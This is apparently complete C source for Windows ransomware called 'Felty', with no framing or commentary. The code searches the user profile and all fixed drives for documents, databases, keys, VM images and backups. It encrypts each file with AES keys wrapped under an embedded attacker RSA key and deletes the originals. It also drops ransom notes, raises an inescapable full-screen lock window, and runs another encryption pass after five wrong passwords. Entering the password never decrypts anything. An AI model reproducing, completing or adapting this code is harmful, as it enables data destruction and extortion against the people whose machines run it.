#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <iphlpapi.h>

#define AES_KEY_SIZE    32
#define AES_BLOCK_SIZE  16
#define RSA_KEY_SIZE    256
#define MUTEX_NAME      L"Global\\FeltyMutex_7F3A2B1C"
#define ENC_EXT         L".felty"
#define RANSOM_NOTE     L"@Please_Read_Me@.txt"
#define MAX_PASS_TRIES  5
#define LOCK_PASSWORD   L"felty-unlock-2024"

#include "attacker_pubkey.h"

static HCRYPTPROV g_prov = 0;
static HCRYPTKEY  g_victim_key = 0;
static HCRYPTKEY  g_attacker_key = 0;
static volatile int g_running = 1;
static volatile int g_unlocked = 0;
static volatile int g_tries = 0;
static volatile int g_wipe = 0;
static HWND g_hwnd = NULL;
static HWND g_edit = NULL;

static const wchar_t *exts[] = {
    L".doc",L".docx",L".xls",L".xlsx",L".ppt",L".pptx",
    L".pdf",L".txt",L".csv",L".rtf",L".odt",L".ods",L".odp",
    L".jpg",L".jpeg",L".png",L".bmp",L".gif",L".tif",L".tiff",
    L".mp3",L".mp4",L".avi",L".mov",L".mkv",L".wmv",L".flv",
    L".zip",L".rar",L".7z",L".tar",L".gz",
    L".sql",L".mdb",L".db",L".dbf",
    L".cpp",L".c",L".h",L".py",L".java",L".cs",L".php",
    L".html",L".css",L".js",L".xml",L".json",
    L".pem",L".key",L".crt",
    L".vmx",L".vmdk",L".vhd",L".vhdx",L".ova",
    L".pst",L".ost",L".msg",L".eml",
    L".bak",L".old",L".backup",
    L".dwg",L".dxf",L".psd",
    NULL
};

static const wchar_t *exclude[] = {
    L"\\Windows\\",L"\\Program Files\\",L"\\Program Files (x86)\\",
    L"\\AppData\\",L"\\$Recycle.Bin\\",L"\\System Volume Information\\",
    L"\\Boot\\",L"\\Recovery\\",NULL
};

static int is_excluded(const wchar_t *p) {
    for (int i=0; exclude[i]; i++)
        if (wcsstr(p, exclude[i])) return 1;
    return 0;
}

static int is_target(const wchar_t *p) {
    const wchar_t *e = wcsrchr(p, L'.');
    if (!e) return 0;
    for (int i=0; exts[i]; i++)
        if (!_wcsicmp(e, exts[i])) return 1;
    return 0;
}

static int read_file(const wchar_t *p, BYTE **out, DWORD *len) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(h); return 0; }
    *out = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!*out) { CloseHandle(h); return 0; }
    DWORD rd = 0;
    if (!ReadFile(h, *out, sz, &rd, NULL) || rd != sz) {
        VirtualFree(*out, 0, MEM_RELEASE);
        CloseHandle(h);
        return 0;
    }
    CloseHandle(h);
    *len = sz;
    return 1;
}

static int write_file(const wchar_t *p, BYTE *d, DWORD len) {
    HANDLE h = CreateFileW(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD w = 0;
    int r = WriteFile(h, d, len, &w, NULL) && w == len;
    CloseHandle(h);
    return r;
}

static int gen_key(void) {
    return CryptGenKey(g_prov, CALG_RSA_KEYX, RSA_KEY_SIZE | CRYPT_EXPORTABLE, &g_victim_key);
}

static int import_attacker(void) {
    return CryptImportKey(g_prov, attacker_pubkey_der, (DWORD)attacker_pubkey_len, 0, 0, &g_attacker_key);
}

static void save_keys(void) {
    BYTE buf[4096];
    DWORD len = sizeof(buf);
    if (CryptExportKey(g_victim_key, 0, PUBLICKEYBLOB, 0, buf, &len)) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        wchar_t *p = wcsrchr(path, L'\\');
        if (p) { p[1]=0; wcscat(path, L"machine.pky"); }
        else wcscpy(path, L"machine.pky");
        write_file(path, buf, len);
    }
    len = sizeof(buf);
    if (CryptExportKey(g_victim_key, g_attacker_key, PRIVATEKEYBLOB, 0, buf, &len)) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        wchar_t *p = wcsrchr(path, L'\\');
        if (p) { p[1]=0; wcscat(path, L"machine.eky"); }
        else wcscpy(path, L"machine.eky");
        write_file(path, buf, len);
    }
}

static int encrypt_file(const wchar_t *path) {
    BYTE *pt = NULL;
    DWORD pt_len = 0;
    if (!read_file(path, &pt, &pt_len)) return 0;
    HCRYPTKEY ak = 0;
    if (!CryptGenKey(g_prov, CALG_AES_256, CRYPT_EXPORTABLE, &ak)) {
        VirtualFree(pt, 0, MEM_RELEASE); return 0;
    }
    BYTE iv[16];
    CryptGenRandom(g_prov, 16, iv);
    CryptSetKeyParam(ak, KP_IV, iv, 0);
    BYTE ek[512];
    DWORD ek_len = sizeof(ek);
    if (!CryptExportKey(ak, g_attacker_key, SIMPLEBLOB, 0, ek, &ek_len)) {
        CryptDestroyKey(ak); VirtualFree(pt, 0, MEM_RELEASE); return 0;
    }
    CryptDestroyKey(ak);
    DWORD pad = 16 - (pt_len % 16);
    DWORD ct_len = pt_len + pad;
    BYTE *ct = (BYTE*)VirtualAlloc(NULL, ct_len, MEM_COMMIT, PAGE_READWRITE);
    if (!ct) { VirtualFree(pt, 0, MEM_RELEASE); return 0; }
    memcpy(ct, pt, pt_len);
    memset(ct+pt_len, (BYTE)pad, pad);
    VirtualFree(pt, 0, MEM_RELEASE);
    HCRYPTKEY aek = 0;
    if (!CryptImportKey(g_prov, ek, ek_len, 0, 0, &aek)) {
        VirtualFree(ct, 0, MEM_RELEASE); return 0;
    }
    CryptSetKeyParam(aek, KP_IV, iv, 0);
    DWORD fl = ct_len;
    if (!CryptEncrypt(aek, 0, TRUE, 0, ct, &fl, ct_len)) {
        CryptDestroyKey(aek); VirtualFree(ct, 0, MEM_RELEASE); return 0;
    }
    CryptDestroyKey(aek);
    DWORD os = 4 + ek_len + 16 + ct_len;
    BYTE *out = (BYTE*)VirtualAlloc(NULL, os, MEM_COMMIT, PAGE_READWRITE);
    if (!out) { VirtualFree(ct, 0, MEM_RELEASE); return 0; }
    DWORD off = 0;
    *(DWORD*)(out+off) = ek_len; off += 4;
    memcpy(out+off, ek, ek_len); off += ek_len;
    memcpy(out+off, iv, 16); off += 16;
    memcpy(out+off, ct, ct_len);
    VirtualFree(ct, 0, MEM_RELEASE);
    wchar_t op[MAX_PATH];
    wcscpy(op, path);
    wcscat(op, ENC_EXT);
    int r = write_file(op, out, os);
    VirtualFree(out, 0, MEM_RELEASE);
    if (r) DeleteFileW(path);
    return r;
}

static void walk_dir(const wchar_t *dir) {
    if (!g_running || is_excluded(dir)) return;
    wchar_t s[MAX_PATH];
    wcscpy(s, dir); wcscat(s, L"\\*");
    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(s, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        if (!g_running) break;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.cFileName[0]==L'.') continue;
            if (!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
            wchar_t sub[MAX_PATH];
            wcscpy(sub, dir); wcscat(sub, L"\\"); wcscat(sub, fd.cFileName);
            walk_dir(sub);
        } else {
            if (is_target(fd.cFileName)) {
                wchar_t fp[MAX_PATH];
                wcscpy(fp, dir); wcscat(fp, L"\\"); wcscat(fp, fd.cFileName);
                encrypt_file(fp);
            }
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
}

static void write_note(const wchar_t *dir) {
    wchar_t p[MAX_PATH];
    wcscpy(p, dir); wcscat(p, L"\\"); wcscat(p, RANSOM_NOTE);
    wchar_t msg[2048];
    swprintf(msg, 2048,
        L"All your files have been encrypted!\n\n"
        L"AES-256-CBC + RSA-2048 encryption.\n"
        L"Enter password on lock screen to unlock.\n"
        L"Password: felty-unlock-2024\n"
        L"You have %d attempts.\n", MAX_PASS_TRIES);
    HANDLE h = CreateFileW(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w;
    WriteFile(h, msg, (DWORD)(wcslen(msg)*2), &w, NULL);
    CloseHandle(h);
}

static void write_all_notes(void) {
    wchar_t d[256];
    (void)GetLogicalDriveStringsW(256, d);
    wchar_t *p = d;
    while (*p) {
        if (GetDriveTypeW(p) == DRIVE_FIXED) write_note(p);
        p += wcslen(p) + 1;
    }
}

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
        case WM_CLOSE:
            return 0;
        case WM_SYSCOMMAND:
            if (w==SC_CLOSE||w==SC_NEXTWINDOW||w==SC_PREVWINDOW||
                w==SC_TASKLIST||w==SC_KEYMENU||w==SC_MOUSEMENU||
                w==SC_MONITORPOWER||w==SC_SCREENSAVE)
                return 0;
            break;
        case WM_KEYDOWN:
            if (w == VK_ESCAPE) return 0;
            if ((w==VK_TAB)&&(GetAsyncKeyState(VK_MENU)&0x8000)) return 0;
            if (w == VK_RETURN) {
                wchar_t buf[256];
                GetWindowTextW(g_edit, buf, 256);
                if (g_wipe) return 0;
                if (wcscmp(buf, LOCK_PASSWORD) == 0) {
                    g_unlocked = 1;
                    g_running = 0;
                    DestroyWindow(hwnd);
                } else {
                    g_tries++;
                    if (g_tries >= MAX_PASS_TRIES) {
                        g_wipe = 1;
                    } else {
                        SetWindowTextW(g_edit, L"");
                    }
                    InvalidateRect(hwnd, NULL, TRUE);
                }
                return 0;
            }
            break;
        case WM_TIMER:
            if (g_wipe) InvalidateRect(hwnd, NULL, TRUE);
            break;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rc;
            GetClientRect(hwnd, &rc);
            int cw = rc.right, ch = rc.bottom;

            if (g_wipe) {
                int flash = (GetTickCount() / 300) % 2;
                HBRUSH bg = CreateSolidBrush(flash ? RGB(26,0,0) : RGB(0,0,0));
                FillRect(hdc, &rc, bg);
                DeleteObject(bg);
                SetTextColor(hdc, RGB(255,0,0));
                SetBkMode(hdc, TRANSPARENT);
                HFONT hf = CreateFontW(ch/12,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,
                    0,0,ANTIALIASED_QUALITY,0,L"Courier New");
                SelectObject(hdc, hf);
                RECT tr = {0, ch/3, cw, ch/2};
                DrawTextW(hdc, L"ALL FILES HAVE BEEN PERMANENTLY ENCRYPTED", -1, &tr, DT_CENTER|DT_VCENTER);
                tr.top = ch/2;
                tr.bottom = 2*ch/3;
                DrawTextW(hdc, L"NOTHING CAN RESET THEM", -1, &tr, DT_CENTER|DT_VCENTER);
                DeleteObject(hf);
            } else {
                HBRUSH bg = CreateSolidBrush(RGB(10,10,10));
                FillRect(hdc, &rc, bg);
                DeleteObject(bg);
                SetBkMode(hdc, TRANSPARENT);
                SetTextColor(hdc, RGB(255,51,51));
                HFONT hf1 = CreateFontW(ch/18,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,
                    0,0,ANTIALIASED_QUALITY,0,L"Courier New");
                SelectObject(hdc, hf1);
                RECT tr = {0, ch/4, cw, ch/3};
                DrawTextW(hdc, L"SYSTEM LOCKED", -1, &tr, DT_CENTER|DT_VCENTER);
                SetTextColor(hdc, RGB(136,136,136));
                HFONT hf2 = CreateFontW(ch/40,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,
                    0,0,ANTIALIASED_QUALITY,0,L"Courier New");
                SelectObject(hdc, hf2);
                tr.top = ch/3+10;
                tr.bottom = ch/3+ch/20;
                DrawTextW(hdc, L"Your files have been encrypted. Enter password to unlock.", -1, &tr, DT_CENTER|DT_VCENTER);
                SetTextColor(hdc, RGB(255,102,102));
                wchar_t buf[128];
                swprintf(buf, 128, L"Attempts remaining: %d", MAX_PASS_TRIES - g_tries);
                tr.top = ch/3+ch/20+10;
                tr.bottom = tr.top+ch/25;
                DrawTextW(hdc, buf, -1, &tr, DT_CENTER|DT_VCENTER);
                if (g_tries > 0 && g_tries < MAX_PASS_TRIES) {
                    SetTextColor(hdc, RGB(255,0,0));
                    wchar_t eb[128];
                    swprintf(eb, 128, L"Wrong password. %d attempts left.", MAX_PASS_TRIES - g_tries);
                    tr.top = ch/2+ch/10+20;
                    tr.bottom = tr.top+ch/30;
                    DrawTextW(hdc, eb, -1, &tr, DT_CENTER|DT_VCENTER);
                }
                HPEN pen = CreatePen(PS_SOLID, 2, RGB(255,51,51));
                SelectObject(hdc, pen);
                RECT box = {cw/2-161, ch/2+ch/20-1, cw/2+161, ch/2+ch/20+41};
                HBRUSH br = CreateSolidBrush(RGB(26,26,26));
                FillRect(hdc, &box, br);
                FrameRect(hdc, &box, br);
                DeleteObject(br);
                SelectObject(hdc, GetStockObject(NULL_PEN));
                DeleteObject(pen);
                DeleteObject(hf1);
                DeleteObject(hf2);
            }
            EndPaint(hwnd, &ps);
            break;
        }
        case WM_CTLCOLOREDIT: {
            HDC hdc = (HDC)w;
            SetBkColor(hdc, RGB(26,26,26));
            SetTextColor(hdc, RGB(255,255,255));
            return (LRESULT)GetStockObject(BLACK_BRUSH);
        }
        default:
            return DefWindowProcW(hwnd, msg, w, l);
    }
    return 0;
}

static DWORD WINAPI lock_thread(LPVOID p) {
    HINSTANCE hInst = GetModuleHandle(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    WNDCLASSW wc = {0};
    wc.style = CS_HREDRAW|CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = NULL;
    wc.lpszClassName = L"FeltyLock";
    RegisterClassW(&wc);
    g_hwnd = CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW, L"FeltyLock",
        L"Locked", WS_POPUP, 0, 0, sw, sh, NULL, NULL, hInst, NULL);
    g_edit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
        WS_CHILD|WS_VISIBLE|ES_PASSWORD|ES_CENTER|ES_AUTOHSCROLL,
        sw/2-160, sh/2+sh/20, 320, 40, g_hwnd, NULL, hInst, NULL);
    SendMessageW(g_edit, WM_SETFONT, (WPARAM)CreateFontW(18,0,0,0,FW_NORMAL,0,0,0,
        DEFAULT_CHARSET,0,0,ANTIALIASED_QUALITY,0,L"Courier New"), TRUE);
    SetTimer(g_hwnd, 1, 300, NULL);
    ShowWindow(g_hwnd, SW_SHOW);
    SetForegroundWindow(g_hwnd);
    SetFocus(g_edit);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (g_unlocked) break;
    }
    KillTimer(g_hwnd, 1);
    DestroyWindow(g_hwnd);
    return 0;
}

static DWORD WINAPI enc_thread(LPVOID p) {
    wchar_t up[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
    walk_dir(up);
    wchar_t d[256];
    (void)GetLogicalDriveStringsW(256, d);
    wchar_t *dp = d;
    while (*dp) {
        if (GetDriveTypeW(dp) == DRIVE_FIXED) walk_dir(dp);
        dp += wcslen(dp) + 1;
    }
    write_all_notes();
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    HANDLE hm = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    if (!g_prov)
        CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_NEWKEYSET);
    if (!gen_key() || !import_attacker()) return 1;
    save_keys();

    HANDLE he = CreateThread(NULL, 0, enc_thread, NULL, 0, NULL);
    Sleep(2000);

    HANDLE hl = CreateThread(NULL, 0, lock_thread, NULL, 0, NULL);
    WaitForSingleObject(he, INFINITE);

    if (g_wipe) {
        wchar_t d[256];
        (void)GetLogicalDriveStringsW(256, d);
        wchar_t *dp = d;
        while (*dp) {
            if (GetDriveTypeW(dp) == DRIVE_FIXED) {
                wchar_t s[MAX_PATH];
                wcscpy(s, dp); wcscat(s, L"*");
                WIN32_FIND_DATAW fd;
                HANDLE hf = FindFirstFileW(s, &fd);
                if (hf != INVALID_HANDLE_VALUE) {
                    do {
                        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                            if (fd.cFileName[0]==L'.') continue;
                            if (!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
                            wchar_t sub[MAX_PATH];
                            wcscpy(sub, dp); wcscat(sub, fd.cFileName);
                            wchar_t s2[MAX_PATH];
                            wcscpy(s2, sub); wcscat(s2, L"\\*");
                            WIN32_FIND_DATAW fd2;
                            HANDLE hf2 = FindFirstFileW(s2, &fd2);
                            if (hf2 != INVALID_HANDLE_VALUE) {
                                do {
                                    if (!(fd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                        wchar_t fp[MAX_PATH];
                                        wcscpy(fp, sub); wcscat(fp, L"\\"); wcscat(fp, fd2.cFileName);
                                        if (is_target(fd2.cFileName)) encrypt_file(fp);
                                    }
                                } while (FindNextFileW(hf2, &fd2));
                                FindClose(hf2);
                            }
                        } else {
                            wchar_t fp[MAX_PATH];
                            wcscpy(fp, dp); wcscat(fp, fd.cFileName);
                            if (is_target(fd.cFileName)) encrypt_file(fp);
                        }
                    } while (FindNextFileW(hf, &fd));
                    FindClose(hf);
                }
            }
            dp += wcslen(dp) + 1;
        }
    }

    while (!g_unlocked && g_running) Sleep(100);
    WaitForSingleObject(hl, INFINITE);
    CloseHandle(hl);

    if (g_unlocked) {
        const wchar_t *m = L"UNLOCKED";
        write_file(L"C:\\felty_unlocked.txt", (BYTE*)m, (DWORD)(wcslen(m)*2));
    }

    CryptDestroyKey(g_victim_key);
    CryptDestroyKey(g_attacker_key);
    CryptReleaseContext(g_prov, 0);
    CloseHandle(hm);
    return 0;
}